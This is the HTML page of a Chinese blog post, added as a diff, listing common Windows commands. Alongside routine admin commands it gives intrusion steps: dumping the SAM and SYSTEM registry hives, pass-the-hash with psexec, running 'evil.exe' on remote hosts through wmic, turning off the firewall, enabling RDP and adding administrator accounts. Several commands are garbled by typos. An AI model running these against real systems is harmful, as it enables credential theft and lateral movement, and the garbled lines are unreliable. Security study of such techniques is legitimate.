@@ -1,0 +1,433 @@
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!doctype html>
+<html lang>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+  <meta name="renderer" content="webkit">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, shrink-to-fit=no" , user-scalable="no"">
+  <title>windows常用命令乔巴Doctor</title>
+  <link rel="shortcut icon" href>
+  
+    
+    
+      <link rel="stylesheet" href="/css/bootstrap.min.css">
+    
+      <link rel="stylesheet" href="/css/font-awesome.min.css">
+    
+      <link rel="stylesheet" href="/css/atom-one-dark.css">
+    
+      <link rel="stylesheet" href="/css/jquery.fancybox.css">
+    
+      <link rel="stylesheet" href="/css/nprogress.min.css">
+    
+      <link rel="stylesheet" href="/css/valine.css">
+    
+      <link rel="stylesheet" href="/css/life.css">
+    
+  
+
+  
+
+  <!-- jQuery first, then Tether, then Bootstrap JS. -->
+  
+  
+  
+    <script src="/js/jquery-2.2.4.min.js"></script>
+  
+    <script src="https://cdn1.lncld.net/static/js/3.1.0/av-min.js"></script>
+  
+    <script src="/js/jquery.pjax.js"></script>
+  
+    <script src="/js/nprogress.min.js"></script>
+  
+    <script src="/js/tether.min.js"></script>
+  
+    <script src="/js/bootstrap.min.js"></script>
+  
+    <script src="/js/highlight.min.js"></script>
+  
+    <script src="/js/highlightjs-line-numbers.min.js"></script>
+  
+    <script src="/js/jquery.fancybox.js"></script>
+  
+    <script src="/js/jquery.qrcode.min.js"></script>
+  
+    <script src="/js/Valine.min.js"></script>
+  
+  
+</head>
+<body>
+<script>AV.init({appId:'',appKey:''});</script>
+<script type="text/javascript">
+      var config = {
+            ClasS: 'Counter',
+            el:'.views',
+            elP: '.views-post'
+      }
+</script>
+<div class="container">
+    <div class="row blog-box-shadow">
+        <!--博客主栏开始-->
+        <div class="col-xl-9 col-lg-12 blog-main" id="pjax-box">
+            <header class="blog-header">
+                <a href="http://meetdoctor.github.io" class="blog-header-mobile-title">乔巴Doctor</a>
+                <a href="javascript:;" class="blog-header-navbar-btn"><i class="fa fa-bars"></i></a>
+                <nav class="blog-header-navbar blog-header-fixed">
+                    <ul class="blog-navbar-links">
+                        
+                          <li class="blog-nav-item"><a href="/" class="transition">首页</a></li>
+                        
+                        <div class="blog-navbar-right">
+                            <form action>
+                                <div class="input-group">
+                                    <input type="text" class="blog-header-search" placeholder="search...">
+                                    <buttn type="submit" class="blog-header-search-btn"><i class="fa fa-search"></i></buttn>
+                                </div>
+                            </form>
+                        </div>
+                    </ul>
+                </nav>
+            </header>
+                
+<header class="blog-post-page-title">
+    <h4>windows常用命令</h4>
+    <time datetime="2019-05-18T15:48:13.000Z"><i class="fa fa-clock-o"></i>2019-05-18</time>
+    
+    
+    
+    
+	
+        <span><i class="fa fa-folder-o"></i>
+    		
+    	       <a href="/categories/技术/" rel="categories" data-toggle="tooltip" data-placement="top" title="Linux">技术</a>
+    		
+        </span>
+	
+    
+</header>
+<div class="blog-main-post blog-post-page-box">
+    <article class="blog-post-block blog-post-page-content">
+        <section>
+            
+                <p>ifconfig /all 获取获取域名、IP地址、DHCP服务器、网关、MAC地址、主机名<br>net time /domain 查看域名、时间<br>net view /domain 查看域内所有共享<br>net view ip 查看对方局域网内开启了哪些共享<br>net config workstation 查看域名、机器名等<br>net user 用户名 密码 /add 建立用户<br>net user guest /active:yes 激活guest账户<br>net user 查看账户<br>net user 账户名 查看指定账户信息<br>net user /domain 查看域内有哪些用户<br>net user 用户名 /domain 查看账户信息<br>net group “domain admins” /domain 查看当前域的管理用户<br>net localgroup administrators 用户名 /add 把用户添加到管理员组中<br>net start 查看开启服务<br>net start 服务名 开启某服务<br>net stop 服务名 停止某服务<br>net share 查看本地开启的共享<br>net share ipc$ 开启ipc$共享<br>net share ipc$ /del 删除ipc$共享<br>net share c$ /del 删除C：共享<br>dsquery server 查看所有域控制器<br>dsquery subnet 查看域内内子网<br>dsquery group 查看域内工作组<br>dsquery site 查看域内站点<br>netstat -a 查看开启了哪些端口,常用netstat -ano<br>netstat -v 查看正在进行的工作<br>netstat -p 协议名 例：netstat -p tcq/ip 查看某协议使用情况（查看tcp/ip协议使用情况）<br>netstat -s 查看正在使用的所有协议使用情况<br>nbtstat -A ip 对方136到139其中一个端口开了的话，就可查看对方最近登陆的用户名（03前的为用户名）-注意：参数-A要大写<br>reg save hklm\sam sam.hive 导出用户组信息、权限配置<br>reg save hklm\system system.hive 导出SYSKEY<br>net use \目标IP\ipc$ 密码 /u:用户名 连接目标机器<br>at \目标IP 21:31 c:\server.exe 在某个时间启动某个应用<br>wmic /node:”目标IP” /password:”123456” /user:”admin” 连接目标机器<br>psexec.exe \目标IP -u username -p password -s cmd 在目标机器上执行cmd<br>finger username @host 查看最近有哪些用户登陆<br>route print 显示出IP路由，将主要显示网络地址Network addres，子网掩码Netmask，网关地址Gateway addres，接口地址Interface<br>arp 查看和处理ARP缓存，ARP是名字解析的意思，负责把一个IP解析成一个物理性的MAC地址。<br>arp -a 将显示出全部信息<br>nslookup IP地址侦测器<br>tasklist 查看当前进程<br>taskkill /pid PID数 终止指定PID进程<br>net user#查看当前系统有哪些用户<br>net  user xiaoming#查看用户的基本信息，所属组<br>net user xiaoming1 123456 /add#添加新用户并设置密码<br>net user xiaoming1 /del#将用户xiaoming1删除<br>net user  /domain#该参数仅在 Windows NT Server 域成员的Windows NT Workstation 计算机上可用。由此可以此判断用户是否是域成员。<br>如果用户在域成员中时：#查看域中所有用户成员<br>net group /domain#查看域中的组<br>net group “Domain Users” /domain</p>
+<p>#查看域组”Domain Users”中的用户成员</p>
+<p>query user#查看当前在线的用户</p>
+<p>net localgroup#查看所有的本地组</p>
+<p>net localgroup administrators</p>
+<p>#查看administrators组中有哪些用户</p>
+<p>net localgroup administratos xiaoming /add</p>
+<p>#将用户xiaoming添加到本地管理员组</p>
+<p>whoami#查看当前用户及权限</p>
+<p>systeminfo#查看计算机信息（版本，位数，补丁情况）</p>
+<p>ver#查看计算机操作系统版本</p>
+<p>tasklist /svc#查看当前计算机进程情况</p>
+<p>netstat -ano#查看当前计算机进程情况</p>
+<p>wmic product &gt; ins.txt#查看安装软件以及版本路径等信息，重定向到ins.txt</p>
+<p>禁用windows防火墙<br>netsh advfirewall set currentprofile state off<br>netsh adbfirewall set all profiles state off<br>本机windows端口转发（必须是管理员权限）不需要借助第三方软件进行转发<br>启用转发<br>netsh interface port proxy add v4tov4 listenport=3000 listenaddress=192.168.1.100 connectport=4000 connectaddress=192.168.1.120<br>停止转发<br>netsh interface portproxy delete v4tov4 listenport=3000 listenaddress=192.168.1.100<br>psexec的一些用法<br>执行远程主机上上的文件或者命令<br>psexec /acceptula \targetip -u domain\user -p password -c -f \smbip \share\file.exe<br>＃注意，第一次执行psexec一定要带aaceptula参数，否则会弹出一个确认对话框，在命令行下是没办法结束的<br>利用用户hash来登录远程主机并执行命令<br>psexec /acceptula \ip -u Domain\user -p LM:NTLM cmd.exe /c dir c:\<br>以system权限来执行远程命令<br>psexec /accepteula \ip -s md.exe<br>修改注册表开启windows终端服务<br>reg add “HKEY LOCAL t1ACHINE\SYSTEH\CurentControlSet\Control\Terminal Server” /v fDenyTSConnections /t REG_DWORD /d 0 /f<br>wmi命令用法详解<br>使用用户名密码通过smb来执行远程主机上的命令或者文件<br>wmic /node: targetiP /user:domain\user /password:password process call create “\ smbiP \share\evil.exe”<br>卸载软件<br>wmic product get name /value  # 获取软件名称<br>wmic product where name=11XXX” call uninstall /nointeractive<br>判定远程登录用户<br>wmic /node:remotecomputer computersystern get username<br>实时获取远程主机进程<br>wmic /node:machinename process list brief /every:1<br>开启远程rdp<br>wmic /node:”machinename 4” path Win32_TerminalServiceSetting where<br>AllowTSConnections=’’O’’ call SetAllowTSConnections ‘’1’’<br>列举用户登录时长<br>wmic netlogin where (name like “%adm%”) get numberoflogons<br>卷影拷贝服务<br>wmic /node: DC IP /user:”DOI1AIN\user” /password:”P ASS 11 process call create “cmd /c vssadmin list shadows 2 &amp;1 c:\temp\output.txt”</p>
+
+            
+        </section>
+        <footer class="blog-post-page-tags">
+        
+			
+				
+			<a href="/tags/cmd命令/" rel="tag" data-toggle="tooltip" data-placement="top" title="Linux">cmd命令</a>
+				
+			
+		
+        </footer>
+    </article>
+    <article class="blog-post-page-readmore">
+    	
+    	
+		
+			<a href="/2019/05/19/渗透测试工程师面试题大全/" class="blog-post-page-readmore-prev" data-toggle="tooltip" data-placement="top" title="网络安全面试题">上一篇</a>
+		
+
+		
+		
+			<a href="/2019/05/18/k先生专栏/" class="blog-post-page-readmore-next" data-toggle="tooltip" data-placement="top" title="欢迎k先生">下一篇</a>
+		
+
+        <div style="clear: both;"></div>
+    </article>
+
+    <article class="blog-post-block blog-post-page-content">
+            <div class="row">
+            
+                <div class="col-md-4 col-sm-4 post-page-more-btn">
+                    <span class="post-comments-btn btn btn-info btn-block" data-toggle="tooltip" data-placement="top" title="本站采用Disqus评论组件，若您没有科学上网可能会无法查看并评论">加载评论</span>
+                </div>
+            
+                <div class="col-md-4 col-sm-4 post-page-more-btn">
+                    <span data-toggle="modal" data-target="#post-donate-content">
+                        <span id="post-donate-btn" class="btn btn-danger btn-block" data-toggle="tooltip" data-placement="top" title="如果您觉得本文还不错或者对您有帮助，可以考虑打赏一下作者哦">打赏本文</span>
+                    </span>
+                </div>
+                <div class="col-md-4 col-sm-4 post-page-more-btn">
+                    <span data-toggle="modal" data-target="#post-qrcode-content">
+                        <span><span id="post-qrcode-btn" class="btn btn-success btn-block" data-toggle="tooltip" data-placement="top" title="微信扫描二维码手机端查看本文及分享本文">二维码</span></span>
+                    </span>
+                </div>
+            </div>
+        <div class="post-more-function-br"></div>
+
+        <div class="modal fade" id="post-donate-content" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
+            <div class="modal-dialog" role="document">
+                <div class="modal-content">
+                    <div class="modal-header">
+                        <h5 class="modal-title" id="exampleModalLabel">打赏本文</h5>
+                        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
+                            <span aria-hidden="true">&times;</span>
+                        </button>
+                    </div>
+                    <div class="modal-body">
+                        <div class="row post-donate-content">
+                            <div class="col-md-4">
+                                <p>支付宝</p>
+                                <img class="post-donate-content-img no-lightbox" src>
+                            </div>
+                            <div class="col-md-4">
+                                <p>微信</p>
+                                <img class="post-donate-content-img no-lightbox" src>
+                            </div>
+                            <div class="col-md-4">
+                                <p>财付通</p>
+                                <img class="post-donate-content-img no-lightbox" src>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="modal-footer">
+                        <button type="button" class="btn btn-secondary" data-dismiss="modal">关闭</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="modal fade" id="post-qrcode-content" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
+            <div class="modal-dialog modal-sm" role="document">
+                <div class="modal-content">
+                    <div class="modal-header">
+                        <h5 class="modal-title" id="exampleModalLabel">文章二维码</h5>
+                        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
+                            <span aria-hidden="true">&times;</span>
+                        </button>
+                    </div>
+                    <div class="modal-body">
+                        <div class="row post-qrcode-content">
+                            <span class="post-qrcode-content-canvas"></span>
+                            <img class="post-qrcode-content-img no-lightbox" src>
+                        </div>
+                    </div>
+                    <div class="modal-footer">
+                        <button type="button" class="btn btn-secondary" data-dismiss="modal">关闭</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <script>
+            // post QRcode
+            // 中文转码
+            function toUtf8(str) {
+                var out, i, len, c;
+                out = "";
+                len = str.length;
+                for (i = 0; i < len; i++) {
+                    c = str.charCodeAt(i);
+                    if ((c >= 0x0001) && (c <= 0x007F)) {
+                        out += str.charAt(i);
+                    } else if (c > 0x07FF) {
+                        out += String.fromCharCode(0xE0 | ((c >> 12) & 0x0F));
+                        out += String.fromCharCode(0x80 | ((c >> 6) & 0x3F));
+                        out += String.fromCharCode(0x80 | ((c >> 0) & 0x3F));
+                    } else {
+                        out += String.fromCharCode(0xC0 | ((c >> 6) & 0x1F));
+                        out += String.fromCharCode(0x80 | ((c >> 0) & 0x3F));
+                    }
+                }
+                return out;
+            }
+            // 生成
+            var qrcode= $('.post-qrcode-content-canvas').qrcode({width: 150,height: 150,text: toUtf8("http://meetdoctor.github.io/2019/05/18/windows常用命令/")}).hide();
+            var canvas=qrcode.find('canvas').get(0);
+            $('.post-qrcode-content-img').attr('src',canvas.toDataURL('image/jpg'));
+        </script>
+
+        
+        
+            <div id="disqus_thread"></div>
+            <script data-no-instant>
+                $(document).ready(function() {
+                    $('.post-comments-btn').on('click', function(){
+                        var disqus_shortname = 'meetdoctor';
+                        $.ajax({
+                            type: "GET",
+                            url: "https://" + disqus_shortname + ".disqus.com/embed.js",
+                            dataType: "script",
+                            cache: true
+                        });
+                        $('.post-more-function-br').css('height','.6em');
+                    });
+                });
+                var reset = function (newIdentifier, newUrl, newTitle, newLanguage) {
+                    DISQUS.reset({
+                        reload: true,
+                        config: function () {
+                            this.page.identifier = newIdentifier;
+                            this.page.url = newUrl;
+                            this.page.title = newTitle;
+                            this.language = newLanguage;
+                        }
+                    });
+                };
+            </script>
+            
+    </article>
+    
+</div>
+
+                
+            <footer class="blog-footer">
+                <p class="blog-footer-left">Copyright ©  2019 <a href="http://meetdoctor.github.io">乔巴Doctor</a></p>
+                <p class="blog-footer-right">Powered by <a href="https://hexo.io" target="_blank">Hexo</a>,Theme <a href="https://note.isweic.com/themes-life/" target="_blank">Life</a></p>
+            </footer>
+        </div><!--博客主栏结束-->
+        <!--博客侧边栏开始-->
+        <div class="col-xl-3 blog-sidebar">
+            <div class="blog-sidebar-title">
+                <a href>乔巴Doctor</a>
+            </div>
+            <div class="blog-sidebar-logo">
+                <img src="/images/qiaoba.jpg">
+            </div>
+            <div class="blog-sidebar-count blog-sidebar-padding">
+                <div class="blog-sidebar-count-left">
+                    <p class="blog-sidebar-count-p">15</p>
+                    <span class="blog-sidebar-count-span">文章</span>
+                </div>
+                <div class="blog-sidebar-count-right">
+                    <p class="blog-sidebar-count-p">10</p>
+                    <span class="blog-sidebar-count-span">标签</span>
+                </div>
+                <div style="clear: both;"></div>
+            </div>
+            <div class="blog-sidebar-icon blog-sidebar-padding">
+                <ul>
+                    <li><a href class="icon-github" target="_blank" data-toggle="tooltip" data-placement="top" title="Github"><i class="fa fa-github"></i></a></li>
+                    <li><a href class="icon-weibo" target="_blank" data-toggle="tooltip" data-placement="top" title="新浪微博"><i class="fa fa-weibo"></i></a></li>
+                    <li><a href class="icon-twitter" target="_blank" data-toggle="tooltip" data-placement="top" title="Twitter"><i class="fa fa-twitter"></i></a></li>
+                    <!--<li><a href="" class="icon-facebook" target="_blank" data-toggle="tooltip" data-placement="top" title="FaceBook"><i class="fa fa-facebook"></i></a></li>-->
+                    <li><a href="mailto:" class="icon-email" data-toggle="tooltip" data-placement="top" title="E-Mail"><i class="fa fa-envelope"></i></a></li>
+                    <li><a href class="icon-rss" data-toggle="tooltip" target="_blank" data-placement="top" title="RSS"><i class="fa fa-rss"></i></a></li>
+                </ul>
+            </div>
+            <div class="blog-sidebar-categories">
+                <h4 class="blog-sidebar-h4"><i class="fa fa-folder-open"></i>&nbsp;文章分类</h4>
+                <ul class="list-group blog-sidebar-padding">
+                  
+                    
+                      <li class="list-group-item justify-content-between">
+                          <a href="/categories/技术/">技术</a>
+                          <span class="badge badge-default badge-pill">11</span>
+                      </li>
+                    
+                      <li class="list-group-item justify-content-between">
+                          <a href="/categories/生活趣事/">生活趣事</a>
+                          <span class="badge badge-default badge-pill">2</span>
+                      </li>
+                    
+                      <li class="list-group-item justify-content-between">
+                          <a href="/categories/k先生专栏/">k先生专栏</a>
+                          <span class="badge badge-default badge-pill">1</span>
+                      </li>
+                    
+                      <li class="list-group-item justify-content-between">
+                          <a href="/categories/法律/">法律</a>
+                          <span class="badge badge-default badge-pill">1</span>
+                      </li>
+                    
+                  
+                </ul>
+            </div>
+            <div class="blog-sidebar-tags">
+                <h4 class="blog-sidebar-h4"><i class="fa fa-tag"></i>&nbsp;标签云</h4>
+                <ul class="blog-sidebar-tags-ul blog-sidebar-padding">
+                  
+                    
+                      <li><a href="/tags/ctf/" class="tag-could" data-toggle="tooltip" data-placement="top" title="ctf">ctf</a></li>
+                    
+                      <li><a href="/tags/闲聊/" class="tag-could" data-toggle="tooltip" data-placement="top" title="闲聊">闲聊</a></li>
+                    
+                      <li><a href="/tags/k先生/" class="tag-could" data-toggle="tooltip" data-placement="top" title="k先生">k先生</a></li>
+                    
+                      <li><a href="/tags/sqlserver/" class="tag-could" data-toggle="tooltip" data-placement="top" title="sqlserver">sqlserver</a></li>
+                    
+                      <li><a href="/tags/技术/" class="tag-could" data-toggle="tooltip" data-placement="top" title="技术">技术</a></li>
+                    
+                      <li><a href="/tags/吐槽/" class="tag-could" data-toggle="tooltip" data-placement="top" title="吐槽">吐槽</a></li>
+                    
+                      <li><a href="/tags/mysql/" class="tag-could" data-toggle="tooltip" data-placement="top" title="mysql">mysql</a></li>
+                    
+                      <li><a href="/tags/cmd命令/" class="tag-could" data-toggle="tooltip" data-placement="top" title="cmd命令">cmd命令</a></li>
+                    
+                      <li><a href="/tags/过狗/" class="tag-could" data-toggle="tooltip" data-placement="top" title="过狗">过狗</a></li>
+                    
+                      <li><a href="/tags/中华人民共和国网络安全法/" class="tag-could" data-toggle="tooltip" data-placement="top" title="中华人民共和国网络安全法">中华人民共和国网络安全法</a></li>
+                    
+                  
+                </ul>
+            </div>
+            <script>
+              // 博客侧栏标签云随机色
+              var tag_cloud = $('.tag-could');
+              tag_cloud.each(function () {
+                  var Cnum = 9;
+                  var Crand = parseInt(Math.random() * Cnum);
+                  $(this).addClass("tag-could" + Crand);
+              })
+            </script>
+            <!--返回顶部按钮-->
+            <div class="retop">
+                <i class="fa fa-angle-up"></i>
+            </div>
+        </div><!--博客侧边栏结束-->
+    </div>
+</div>
+<script src="/js/LeanStatistics.min.js"></script>
+<script src="/js/Life.js"></script>
+<script type="text/javascript">
+    hljs.initHighlightingOnLoad();
+    hljs.initLineNumbersOnLoad();
+    otherF();
+    LeanStatistics();
+    $(document).pjax('a', '#pjax-box', {fragment:'#pjax-box', timeout:8000}).on('pjax:complete', function() {
+      $('pre code').each(function(i, block){
+        hljs.highlightBlock(block);
+      })
+      $('code.hljs').each(function(i, block) {
+        hljs.lineNumbersBlock(block);
+      });
+      LeanStatistics();
+    }).on('pjax:start', function() { NProgress.start(); }).on('pjax:end',   function() {
+      NProgress.done();
+      otherF();
+    });
+</script>
+</body>
+</html>
